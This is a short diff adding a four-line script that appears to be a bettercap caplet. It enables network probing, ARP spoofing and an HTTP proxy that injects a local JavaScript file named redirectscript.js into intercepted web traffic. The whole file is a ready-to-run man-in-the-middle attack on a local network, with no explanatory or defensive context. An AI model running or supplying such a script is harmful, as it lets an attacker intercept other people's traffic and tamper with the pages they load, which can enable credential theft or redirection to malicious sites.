@@ -1,0 +1,4 @@
+net.probe on
+arp.spoof on
+set http.proxy.injectjs /home/nmp/redirectscript.js
+http.proxy on
